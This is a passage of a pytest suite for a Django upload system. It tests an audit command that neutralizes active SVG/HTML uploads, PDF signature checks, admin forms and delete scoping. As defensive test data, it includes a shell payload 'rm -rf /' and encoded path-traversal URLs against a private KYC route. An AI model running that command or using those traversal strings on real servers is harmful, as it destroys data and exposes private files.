    out = StringIO()
    call_command("audit_active_uploads", "--json", stdout=out)
    report = json.loads(out.getvalue())

    ids = {row["id"] for row in report["active_document_rows"]}
    assert legacy_svg.id in ids and legacy_html.id in ids
    assert ok.id not in ids
    assert report["active_document_count"] == 2
    assert report["applied"] is False

    # Default is a report: nothing changed.
    legacy_svg.refresh_from_db()
    assert legacy_svg.access == "public"


@pytest.mark.django_db(transaction=True)
def test_audit_does_not_flag_a_benign_name_on_the_strength_of_mime_type(
        creator_factory):
    """
    Adversarial review finding 3. Old uploads took `mime_type` straight from
    client-supplied multipart metadata, so a genuine PNG stored as `cat.png`
    can carry a recorded type of `image/svg+xml` — and is still served
    `image/png`, because the served type comes from the *name*. Acting on that
    column would put benign user data in front of `--delete`.
    """
    creator = creator_factory(username="kevin")
    benign = GenericFile.objects.create(
        owner=creator, file=ContentFile(PNG, name="cat.png"),
        mime_type="image/svg+xml", access="public",
    )
    really_active = GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/png", access="public",   # lying the other way
    )

    out = StringIO()
    call_command("audit_active_uploads", "--json", stdout=out,
                 stderr=StringIO())
    report = json.loads(out.getvalue())

    active_ids = {r["id"] for r in report["active_document_rows"]}
    suspicious_ids = {r["id"] for r in report["suspicious_metadata_rows"]}
    # The name is what the origin serves, so the name is what decides.
    assert really_active.id in active_ids
    assert benign.id not in active_ids
    assert benign.id in suspicious_ids

    #...and a destructive run leaves the benign row alone.
    call_command("audit_active_uploads", "--delete", "--apply",
                 "--yes-i-really-mean-delete", stdout=StringIO(),
                 stderr=StringIO())
    assert GenericFile.objects.filter(id=benign.id).exists()
    assert not GenericFile.objects.filter(id=really_active.id).exists()


@pytest.mark.django_db(transaction=True)
def test_audit_neutralize_renames_so_it_can_never_be_served_as_a_document(
        creator_factory):
    """
    Adversarial review finding 2: `--quarantine` only closes the anonymous
    public-origin path — `uploads_auth` still returns OK unconditionally for
    superusers, and also for the owner, so a quarantined SVG still executes
    for the admin triaging the private link.

    `--neutralize` fixes that without destroying anything: the served
    Content-Type is derived from the stored name, so renaming to `.bin` makes
    it `application/octet-stream`, which no browser executes.
    """
    creator = creator_factory(username="kevin")
    row = GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/svg+xml", access="public",
    )
    original_name = row.file.name
    storage = row.file.storage

    # Dry run by default.
    call_command("audit_active_uploads", "--neutralize", stdout=StringIO(),
                 stderr=StringIO())
    row.refresh_from_db()
    assert row.file.name == original_name

    err = StringIO()
    call_command("audit_active_uploads", "--neutralize", "--apply",
                 stdout=StringIO(), stderr=err)

    row.refresh_from_db()
    assert row.file.name.endswith(".bin")
    # It is no longer servable as an active document...
    assert mimetypes.guess_type(row.file.name)[0] not in ACTIVE_MIME_TYPES
    #...the bytes survived, unchanged...
    with row.file.open("rb") as fh:
        assert fh.read() == EVIL_SVG
    #...the old object is gone from storage...
    assert not storage.exists(original_name)
    #...and the row is otherwise untouched.
    assert row.access == "public"
    assert "invalidate-cdn-cache" in err.getvalue()


@pytest.mark.django_db(transaction=True)
def test_audit_neutralize_is_idempotent(creator_factory):
    creator = creator_factory(username="kevin")
    GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/svg+xml", access="public",
    )
    for _ in range(2):
        call_command("audit_active_uploads", "--neutralize", "--apply",
                     stdout=StringIO(), stderr=StringIO())

    names = list(GenericFile.objects.values_list("file", flat=True))
    assert len(names) == 1
    assert names[0].endswith(".svg.bin")      # not ".svg.bin.bin"


@pytest.mark.django_db(transaction=True)
def test_audit_neutralize_streams_instead_of_buffering_the_object(
        creator_factory, mocker):
    """
    Historical stored objects may be multi-GiB, and this runs in a container
    with a hard memory limit, so the object must be handed to storage as a
    stream. Reading it into a bytes object first would OOMKill the pod partway
    through remediation — before anything was actually defused.
    """
    creator = creator_factory(username="kevin")
    row = GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/svg+xml", access="public",
    )

    from django.core.files.storage import Storage

    # FileSystemStorage inherits save() from Storage, and so does the GCS
    # backend, so this catches the call whichever is configured.
    save_spy = mocker.spy(Storage, "save")

    call_command("audit_active_uploads", "--neutralize", "--apply",
                 stdout=StringIO(), stderr=StringIO())

    # What reached storage.save was a File-like object, not a bytes blob that
    # had already been fully materialized.
    _, name, content = save_spy.call_args[0]
    assert name.endswith(".bin")
    assert hasattr(content, "chunks")
    assert not isinstance(content, (bytes, bytearray))


@pytest.mark.django_db(transaction=True)
def test_audit_bounds_what_it_retains_for_the_informational_sections(
        creator_factory):
    """
    `--limit` bounds *display*; it never bounded what the command held in
    memory. Off-allowlist rows can be a large fraction of the table, so a
    report-only run could exhaust the container before telling anyone what
    needed remediating. Counts stay exact; only retention is capped — and the
    actionable set is never sampled.
    """
    creator = creator_factory(username="kevin")
    for i in range(5):
        GenericFile.objects.create(
            owner=creator, file=ContentFile(PNG, name=f"legacy{i}.png"),
            mime_type="application/zip", access="public",
        )
    GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/svg+xml", access="public",
    )

    out = StringIO()
    call_command("audit_active_uploads", "--json", "--sample-cap", "2",
                 stdout=out, stderr=StringIO())
    report = json.loads(out.getvalue())

    assert report["off_allowlist_count"] == 5           # exact
    assert len(report["off_allowlist_rows"]) == 2       # retained sample
    assert report["rows_sampled"] is True
    # The actionable set is complete regardless of the cap.
    assert report["active_document_count"] == 1
    assert len(report["active_document_rows"]) == 1


@pytest.mark.django_db(transaction=True)
def test_audit_modes_are_mutually_exclusive():
    from django.core.management.base import CommandError

    with pytest.raises(CommandError):
        call_command("audit_active_uploads", "--neutralize", "--quarantine",
                     stdout=StringIO(), stderr=StringIO())


@pytest.mark.django_db(transaction=True)
def test_audit_active_uploads_quarantine_requires_apply(creator_factory):
    creator = creator_factory(username="kevin")
    row = GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/svg+xml", access="public",
    )

    call_command("audit_active_uploads", "--quarantine", stdout=StringIO())
    row.refresh_from_db()
    assert row.access == "public"

    out, err = StringIO(), StringIO()
    call_command("audit_active_uploads", "--quarantine", "--apply",
                 stdout=out, stderr=err)
    row.refresh_from_db()
    assert row.access == "private"
    # Remediating the database is not remediating the edge cache — the
    # operator has to be told, every time (codex review finding 2).
    assert "invalidate-cdn-cache" in err.getvalue()
    assert "--path '/uploadz/*'" in err.getvalue()
    assert "--path '/og/zpage/*'" in err.getvalue()


@pytest.mark.django_db(transaction=True)
@pytest.mark.parametrize("extra", [
    [],
    ["--quarantine"],                                  # dry run
    ["--quarantine", "--apply"],                       # writes
    ["--delete", "--yes-i-really-mean-delete"],        # dry run
])
def test_audit_json_output_is_always_parseable(creator_factory, extra):
    """
    `--json` is the mode an operator scripts. Operational chatter used to be
    written to stdout ahead of the document, so `| jq` blew up in exactly the
    modes that change something — and the CDN warning was suppressed for the
    caller most likely to need it.
    """
    creator = creator_factory(username="kevin")
    GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/svg+xml", access="public",
    )

    out, err = StringIO(), StringIO()
    call_command("audit_active_uploads", "--json", *extra,
                 stdout=out, stderr=err)

    report = json.loads(out.getvalue())          # must not raise
    assert report["active_document_count"] == 1
    if "--apply" in extra:
        assert report["changed"] == 1
        assert report["cdn_invalidation_required"] is True
        assert "invalidate-cdn-cache" in err.getvalue()
    else:
        assert report["changed"] == 0
        assert report["cdn_invalidation_required"] is False


@pytest.mark.django_db(transaction=True)
def test_audit_active_uploads_delete_needs_two_confirmations(creator_factory):
    from django.core.management.base import CommandError

    creator = creator_factory(username="kevin")
    row = GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/svg+xml", access="public",
    )

    with pytest.raises(CommandError):
        call_command("audit_active_uploads", "--delete", "--apply",
                     stdout=StringIO())
    assert GenericFile.objects.filter(id=row.id).exists()

    with pytest.raises(CommandError):
        call_command("audit_active_uploads", "--delete", "--quarantine",
                     "--yes-i-really-mean-delete", "--apply", stdout=StringIO())
    assert GenericFile.objects.filter(id=row.id).exists()

    call_command(
        "audit_active_uploads", "--delete", "--apply",
        "--yes-i-really-mean-delete", stdout=StringIO(), stderr=StringIO(),
    )
    assert not GenericFile.objects.filter(id=row.id).exists()


# ---------------------------------------------------------------------------
# Admin — the remediation UI must still work on the rows being remediated
# ---------------------------------------------------------------------------

@pytest.mark.django_db(transaction=True)
def test_admin_can_still_edit_a_legacy_svg_row(creator_factory, rf):
    """
    Adversarial review finding 4. Two separate things blocked the change form
    for a legacy `.svg` row — the FileExtensionValidator on `file`, and
    `image/svg+xml` no longer being in `mime_type`'s choices — and fixing only
    the first left the form failing with "Select a valid choice".

    These are exactly the rows an admin needs to reach in order to flip
    `access` to private, so the form has to validate.
    """
    from django.contrib.admin.sites import AdminSite

    from dj.apps.uploads.admin import GenericFileAdmin

    creator = creator_factory(username="kevin")
    legacy = GenericFile.objects.create(
        owner=creator, file=ContentFile(EVIL_SVG, name="evil.svg"),
        mime_type="image/svg+xml", access="public", title="legacy",
    )

    model_admin = GenericFileAdmin(GenericFile, AdminSite())
    request = rf.post("/admin/uploads/genericfile/1/change/")
    form_class = model_admin.get_form(request, obj=legacy, change=True)

    # Neither derived field is on the change form any more...
    assert "file" not in form_class.base_fields
    assert "mime_type" not in form_class.base_fields

    #...so the operator can flip access without tripping either check.
    form = form_class(
        {
            "title": "legacy",
            "description": "",
            "access": "private",
            "owner": creator.pk,
            "skip_thumbnail": "",
        },
        instance=legacy,
    )
    assert form.is_valid(), form.errors.as_json()
    form.save()
    legacy.refresh_from_db()
    assert legacy.access == "private"
    assert legacy.file.name.endswith(".svg")      # untouched


@pytest.mark.django_db(transaction=True)
def test_admin_add_form_still_validates_the_extension(creator_factory, rf):
    """
    Read-only on *change* only: adding a file through the admin still runs the
    allowlist validator, which is where it belongs.
    """
    from django.contrib.admin.sites import AdminSite

    from dj.apps.uploads.admin import GenericFileAdmin

    model_admin = GenericFileAdmin(GenericFile, AdminSite())
    request = rf.post("/admin/uploads/genericfile/add/")
    form_class = model_admin.get_form(request, obj=None)

    assert "file" in form_class.base_fields
    assert "mime_type" in form_class.base_fields

    creator = creator_factory(username="kevin")
    form = form_class(
        {
            "title": "x", "description": "", "access": "public",
            "owner": creator.pk, "mime_type": "image/png",
            "skip_thumbnail": "",
        },
        {"file": SimpleUploadedFile("evil.svg", EVIL_SVG,
                                    content_type="image/svg+xml")},
    )
    assert not form.is_valid()
    assert "file" in form.errors


# ---------------------------------------------------------------------------
# The private (KYC) serve path — same  traversal class, still closed
# ---------------------------------------------------------------------------

@pytest.mark.django_db(transaction=True)
@pytest.mark.parametrize("suffix", [
    "%2F..%2F{other}/id_front.png",
    "%2f..%2f{other}/id_front.png",
    "%2F%2E%2E%2F{other}/id_front.png",
])
def test_private_auth_still_rejects_encoded_traversal(
        client, creator_factory, suffix):
    from dj.apps.kyc.models import UserProfile

    owner = creator_factory(username="kevin")
    other = creator_factory(username="jonathan")
    mine = UserProfile.objects.create(user=owner)
    theirs = UserProfile.objects.create(user=other)

    client.force_login(owner)
    uri = f"/uploadz/private/{mine.id}" + suffix.format(other=theirs.id)

    assert client.get(
        reverse("uploads_auth_private"), HTTP_X_ORIGINAL_URI=uri,
    ).status_code == 401


# ---------------------------------------------------------------------------
# PDF, the document-manager case
#
# The client used to reject PDFs in the browser before making any request,
# while the server had accepted `application/pdf` since. Fixing the client
# widens what actually reaches `uploads_handle`, so the guard that matters is
# the one below: widening the *client* must not widen the *server*. A `.pdf`
# name over non-PDF bytes is still a hard 400, and the only thing that decides
# is the leading bytes — the one signal the uploader cannot forge.
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload,label", [
    (EVIL_SVG, "svg"),
    (EVIL_HTML, "html"),
    (b'<?xml version="1.0"?><root/>', "xml"),
    (b'PK\x03\x04' + b'\x00' * 32, "zip"),
    (b'#!/bin/sh\nrm -rf /\n', "shell script"),
    (b'MZ\x90\x00\x03' + b'\x00' * 32, "windows executable"),
    (b'\x7fELF\x02\x01\x01' + b'\x00' * 32, "elf executable"),
    (b'not a pdf at all, just text', "plain text"),
    # The near-miss: `%PDF` but not at offset 0. A PDF reader will happily
    # find the header a few bytes in; our sniffer must not.
    (b'GIF89a%PDF-1.4\n', "pdf header behind another signature"),
])
def test_a_pdf_name_over_non_pdf_bytes_is_rejected(payload, label):
    for declared in ("application/pdf", "application/x-pdf", "", "text/html"):
        with pytest.raises(UploadTypeError):
            validate_upload(_upload("form.pdf", payload, declared))


def test_declaring_pdf_cannot_launder_an_active_document():
    """
    The mirror of `test_declaring_heif_does_not_launder_an_active_document`.
    `application/x-pdf` normalizes to `application/pdf` (DECLARED_TYPE_ALIASES),
    which silences the declared-type tripwire — and changes nothing, because
    the alias never touches the sniffer and SVG/HTML have no signature to find.
    """
    for name in ("evil.svg", "evil.html", "evil.pdf"):
        with pytest.raises(UploadTypeError):
            validate_upload(_upload(name, EVIL_SVG, "application/x-pdf"))


def test_pdf_bytes_under_an_active_extension_are_refused_not_renamed():
    """
    The other direction: honest PDF bytes named `.html`. `.html` resolves to a
    format we do not accept, so this is a hard 400 — the name is an assertion
    we refuse to store, and silently renaming it would hide the attempt. The
    declared type makes no difference; the extension check runs on its own.

    This is the property that keeps the extension from becoming a back door
    now that PDF is a type creators actually upload: the served Content-Type
    comes from the stored name, so a stored name we did not choose is the
    whole  bug.
    """
    for declared in ("text/html", "application/pdf", ""):
        with pytest.raises(UploadTypeError):
            validate_upload(_upload("invoice.html", PDF, declared))

    # With no extension to contradict them, the bytes name the file, and
    # django-storages will serve it `application/pdf`.
    honest = _upload("invoice", PDF, "application/pdf")
    assert validate_upload(honest) == "application/pdf"
    assert honest.name == "invoice.pdf"
    assert mimetypes.guess_type(honest.name)[0] == "application/pdf"


@pytest.mark.django_db(transaction=True)
def test_uploads_handle_rejects_a_spoofed_pdf(client, creator_factory):
    """
    Through the real view, with a real DB: nothing is persisted.
    """
    creator = creator_factory(username="kevin")
    client.force_login(creator)

    response = client.post(
        reverse("uploads_handle"),
        {
            "body": '[{"title": "tax form", "access": "private"}]',
            "files": _upload("w9.pdf", EVIL_HTML, "application/pdf"),
        },
    )

    assert response.status_code == 400
    assert not GenericFile.objects.exists()


@pytest.mark.django_db(transaction=True)
@pytest.mark.parametrize("access", ["private", "public"])
def test_uploads_handle_accepts_a_real_pdf_and_serves_it_as_one(
        client, creator_factory, access):
    """
    The  happy path, asserted on the three things the manager's document
    card actually reads: the API `mime_type`, the stored extension (which is
    what the served `Content-Type` is derived from), and the absence of a
    thumbnail — a PDF has no image to show, so the card must be a document
    card rather than a broken `<img>`.
    """
    creator = creator_factory(username="kevin")
    client.force_login(creator)

    response = client.post(
        reverse("uploads_handle"),
        {
            "body": json.dumps([{"title": "W-9", "access": access}]),
            "files": _upload("W-9 form.pdf", PDF, "application/pdf"),
        },
    )

    assert response.status_code == 201, response.content
    record = response.json()[0]
    assert record["mime_type"] == "application/pdf"
    assert record["access"] == access
    assert record["thumbnail"] is None
    assert record["thumb"] is None and record["card"] is None
    assert record["variants"] == []
    assert record["url"]

    stored = GenericFile.objects.get(id=record["id"])
    assert stored.file.name.startswith("kevin/")
    assert stored.file.name.endswith(".pdf")
    # django-storages derives the served Content-Type from exactly this name.
    assert mimetypes.guess_type(stored.file.name)[0] == "application/pdf"


@pytest.mark.django_db(transaction=True)
def test_the_manager_can_list_filter_and_delete_a_pdf(client, creator_factory):
    """
    Every card action the dashboard offers, against the real endpoints:
    it is listed by /api/myuploads/, it is reachable through the
    `mime_type=application/` filter the "Documents" option sends, and DELETE
    removes it.  asked for a document *manager*, not just an upload.
    """
    creator = creator_factory(username="kevin")
    client.force_login(creator)

    created = client.post(
        reverse("uploads_handle"),
        {
            "body": '[{"title": "W-9", "access": "private"}]',
            "files": _upload("w9.pdf", PDF, "application/pdf"),
        },
    ).json()[0]
    client.post(
        reverse("uploads_handle"),
        {
            "body": '[{"title": "cat", "access": "private"}]',
            "files": _upload("cat.png", PNG, "image/png"),
        },
    )

    listed = client.get("/api/myuploads/").json()
    assert {row["id"] for row in listed["results"]} == set(
        GenericFile.objects.values_list("id", flat=True))

    # `GenericFileFilter.mime_type` is `istartswith`, which is why the client
    # sends a prefix rather than a full type.
    documents = client.get("/api/myuploads/?mime_type=application/").json()
    assert [row["id"] for row in documents["results"]] == [created["id"]]

    images = client.get("/api/myuploads/?mime_type=image/").json()
    assert created["id"] not in [row["id"] for row in images["results"]]

    assert client.delete(f"/api/myuploads/{created['id']}/").status_code == 204
    assert not GenericFile.objects.filter(id=created["id"]).exists()


@pytest.mark.django_db(transaction=True)
def test_one_creator_cannot_delete_another_creators_file(
        client, creator_factory):
    """
    The delete button is new, so pin the scoping it depends on:
    MyUploadsViewSet.get_queryset filters by owner, so somebody else's id is a
    404, not a deletion.
    """
    owner = creator_factory(username="kevin")
    intruder = creator_factory(username="jonathan")

    client.force_login(owner)
    created = client.post(
        reverse("uploads_handle"),
        {
            "body": '[{"title": "W-9", "access": "private"}]',
            "files": _upload("w9.pdf", PDF, "application/pdf"),
        },
    ).json()[0]

    client.force_login(intruder)
    assert client.delete(f"/api/myuploads/{created['id']}/").status_code == 404
    assert GenericFile.objects.filter(id=created["id"]).exists()


@pytest.mark.django_db(transaction=True)
def test_deleting_a_file_that_illustrates_a_story_page_is_refused(
        client, creator_factory):
    """
    Codex review of, finding 1. `storytime.Page.image` is the only
    CASCADE reference to GenericFile, so deleting a story illustration used to
    delete the story page with it — prompt, text and ordering — content the
    creator paid 1 2Z per page to generate. Nothing called the endpoint before
     put a delete button on every row, so the cascade was latent; now it
    would be routine.

    409, nothing deleted, and the message names what has to go first.
    """
    from dj.apps.storytime.models import Page, Story

    creator = creator_factory(username="kevin")
    client.force_login(creator)

    created = client.post(
        reverse("uploads_handle"),
        {
            "body": '[{"title": "art", "access": "public"}]',
            "files": _upload("art.png", PNG, "image/png"),
        },
    ).json()[0]
    art = GenericFile.objects.get(id=created["id"])

    story = Story.objects.create(creator=creator, title="A story")
    page = Page.objects.create(story=story, prompt="a cat", image=art, order=1)

    response = client.delete(f"/api/myuploads/{art.id}/")

    assert response.status_code == 409, response.content
    assert "story" in response.json()["detail"].lower()
    # Neither the file nor the paid page went anywhere.
    assert GenericFile.objects.filter(id=art.id).exists()
    assert Page.objects.filter(id=page.id).exists()

    #...and once the page is gone the file deletes normally.
    page.delete()
    assert client.delete(f"/api/myuploads/{art.id}/").status_code == 204
    assert not GenericFile.objects.filter(id=art.id).exists()


@pytest.mark.django_db(transaction=True)
def test_set_null_references_do_not_block_deletion(client, creator_factory):
    """
    The guard is narrow on purpose. Every other reference to GenericFile is
    SET_NULL — a zPage keeps existing without its cover — so those must NOT be
    refused, or the delete button would be unusable for the images creators
    most want to remove.
    """
    from dj.apps.g12f.models import zPage

    creator = creator_factory(username="kevin")
    client.force_login(creator)

    created = client.post(
        reverse("uploads_handle"),
        {
            "body": '[{"title": "cover", "access": "public"}]',
            "files": _upload("cover.png", PNG, "image/png"),
        },
    ).json()[0]
    cover = GenericFile.objects.get(id=created["id"])

    zpage = zPage.objects.create(
        creator=creator, title="A page", featured_image=cover)

    assert client.delete(f"/api/myuploads/{cover.id}/").status_code == 204
    zpage.refresh_from_db()
    assert zpage.featured_image_id is None
